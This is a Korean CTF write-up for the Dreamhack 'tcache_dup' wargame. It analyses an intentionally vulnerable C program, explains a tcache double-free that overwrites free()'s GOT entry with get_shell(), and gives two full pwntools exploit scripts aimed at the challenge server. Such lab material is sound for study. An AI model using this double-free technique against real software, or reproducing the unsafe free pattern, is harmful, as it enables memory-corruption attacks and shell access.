# Exercise: tcache_dup

# 들어가며

## 서론

---

tcache 관련 보안 기법이 적용되지 않은 환경에서 일어나는 단순한 형태의 **double free bug**를 실습한다.

## 문제 목표 및 기능

---

이 문제에서는 사용자가 임의 크기의 메모리를 할당 받고 해제할 수 있기 때문에, 해제된 tcache를 다시 해제하는 것으로 double free bug를 일으킬 수 있다. 해당 취약점을 이용해 GOT overwrite를 수행할 수 있고, 바이너리 내에 내장된 get_shell() 함수로 실행 흐름을 변경하여 셸을 획득할 수 있다.

# 분석 및 설계

## 분석

---

### 보호 기법

```c
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

적용된 보호 기법을 살펴보면, 실습환경에는 **ASLR**이 적용되어 있고, 바이너리에는 **NX** 및 **Canary**가 적용되어 있다. **PIE**는 적용되지 않았다.

또한 Partial RELRO가 적용되어 있어 GOT overwrite이 가능하다. PIE가 적용되지 않았기 때문에, 추가적인 과정 없이 바이너리 내의 함수 혹은 가젯 주소를 쉽게 이용할 수 있다.

### 코드 분석

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```

프로그램 내부에 get_shell 함수가 존재한다. 이를 이용하여 셸을 획득할 수 있을 것이다.

delete() 함수에서 해제한 포인터를 NULL로 초기화하지 않고 있으므로, dangling pointer가 생긴다. 따라서 이를 이용하여 double free를 발생시킬 수 있다. 이때 double free에 대한 보호 기법이 없으므로 따로 생각할 것 없이 그냥 두 번 free 함수를 호출해주면 된다.

# 익스플로잇

## 익스플로잇

---

### 취약점 분석

해당 바이너리에서는 double free bug가 발생하여, 임의 위치에 임의 값을 쓸 수 있게 된다. 이 때, 다음과 같은 시나리오를 생각할 수 있다.

1. 0x10 사이즈에 해당하는 메모리를 할당. 이 때 할당 받은 주소를 A라고 가정.
2. 1. 에서 할당 받은 메모리를 두 번 해제하여 tcache에 double free bug 트리거 (A → A).
3. tcache에서 0x10 사이즈에 해당하는 메모리를 할당. 이 때 덮어쓸 주소를 B라고 가정하고, 할당과 동시에 B 데이터 제공 (A → B)
4. tcache에서 0x10 사이즈에 해당하는 메모리를 할당 (B)
5. 이 상태에서 0x10 사이즈에 해당하는 메모리 할당을 요청하면, B 주소에 할당 받을 수 있음. 이 때 원하는 데이터를 제공하면 B 주소에 임의 값을 덮어쓸 수 있음.

### 익스플로잇 시나리오

위 시나리오를 통해 GOT overwrite를 이용하여 덮어쓸 위치와 덮어쓸 값을 확인해보자.

바이너리에서 사용자가 원하는 타이밍에 free()를 실행할 수 있고, system(”/bin/sh”)를 실행하는 get_shell() 함수가 주어지기 때문에 free()의 GOT에 get_shell()의 주소를 덮어쓰면 됨을 파악할 수 있다. 이 때, 바이너리에 PIE 보호 기법이 적용되지 않았기 때문에 바이너리에서 추출한 GOT 및 get_shell()의 주소를 그대로 사용하면 된다.

### 익스플로잇 코드

```c
#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./tcache_dup', env={'LD_PRELOAD': './libc-2.27.so'})

e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

# 1. trigger double free bug
create(0x10, b'AAAAAAAA')
delete(0)
delete(0)
# 2. aaw to free_got with get_shell
create(0x10, p64(e.got['free']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))
# 3. trigger free() to get shell
delete(0)

p.interactive()
```

### 내 코드

```c
from pwn import *

p = remote("host3.dreamhack.games", 17916)
e = ELF("./tcache_dup")

p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Size: ", b'16')
p.sendafter(b"Data: ", b'A')

p.sendlineafter(b"> ", b'2')
p.sendlineafter(b"idx: ", b'0')

p.sendlineafter(b"> ", b'2')
p.sendlineafter(b"idx: ", b'0')

free = e.got['free']
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Size: ", b'16')
p.sendafter(b"Data: ", p64(free))

p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Size: ", b'16')
p.sendafter(b"Data: ", b'B')

shell = e.symbols['get_shell']
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Size: ", b'16')
p.sendafter(b"Data: ", p64(shell))

p.sendlineafter("> ", b'2')
p.sendlineafter("idx: ", b'0')

p.interactive()
```